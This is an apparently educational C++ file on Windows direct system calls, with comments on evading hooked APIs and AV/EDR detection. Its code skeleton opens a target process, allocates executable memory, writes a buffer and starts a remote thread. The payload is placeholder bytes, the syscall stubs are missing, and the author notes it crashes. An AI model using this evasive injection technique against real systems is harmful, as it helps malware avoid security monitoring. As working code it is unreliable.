#include <Windows.h>
#include <iostream>

// WINDOWS SYSTEM CALLS 

/*

System calls are a part of every operating system. They separate the user mode from the kernel space, this is a security feature. 
The kernel is the heart of any operating system, every os has one and it is the main brains of the operation. The best example for this is your body. 
User mode:
- your exterior body 
- limbs 
- eyes 

Kernel mode:
- vital organs 

The os has to make requests to the kernel to perform specific actions, thse come in the form of system calls commonly abbreviated to as syscalls. 
This is due to the security ramifications if these requests were unomitoried and unrestricted, similarly why kernel memory and user mode memory are two different beasts
to encapsulate the user and their activities and keep the vital core of the system protected. However, like anything and everything it can be exploited.


What we will be doing is a direct system call to avoid tripping any potential detection vectors such as hooked windows apis via nt functions or winapi functions. 
The limitation of this is that if a process we want to avoid detection from, is in the kernelspace, we will be out of luck, as in the kernel for simplicitys sake, anything can be seen.

Anything I explain can be better explained by better people here: 
https://en.wikipedia.org/wiki/System_call
https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/


Windows system calls 
Windows stores its native system api in ntdll.dll, this is the lowest part of usermode access, this file essentially controlls the requests from the user to the kernel.
A request is made via the windows api and sent through a wrapper to reach a native function, e.g. CreateRemoteThread -> NtCreateThreadEx -> request to kernel

What direct system calling itends to do is avoid the first part of the process altogether by cutting out the windows api and just making the request directly. 
Instead of calling the windows functions required we can directly invoke the system call via its defined system call number.
*/

/*
The below function declaration for NtCreateThreadEx 
the assembly is being linked to the C code here via the 
linker. 

Extern "C" tells the linker there is an external definition for this function essentially
It also means if it is an external function it will use the C calling convention

*/
extern "C" NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

extern "C" NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN ULONG NumberOfBytesToWrite,
	OUT PULONG NumberOfBytesWritten OPTIONAL);
	

int main()
{
	/*
	* For viewing pleasure to see the function dissasembled
	*/
	HANDLE hNtdll = GetModuleHandle(L"ntdll.dll");
	PVOID pNtCreateThreadEx = GetProcAddress((HMODULE)hNtdll, "NtCreateThreadEx");

	DWORD dwTargetProcID = 10008;
	HANDLE hTargetProc;
	HANDLE hThreadHandle;
	char payload[] = { 0x1, 0x2, 0x3 };

	// getting handle to process 
	hTargetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetProcID);

	PVOID pBuffer = VirtualAllocEx(hTargetProc, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(hTargetProc, pBuffer, payload, sizeof(payload), NULL);
	printf("Last error: %d", GetLastError());

	// crashing on thread creation ??
	NtCreateThreadEx(&hThreadHandle, PROCESS_ALL_ACCESS, NULL, hTargetProc, (LPTHREAD_START_ROUTINE)pBuffer, NULL, false, NULL, NULL, NULL, NULL);

	return 0;
}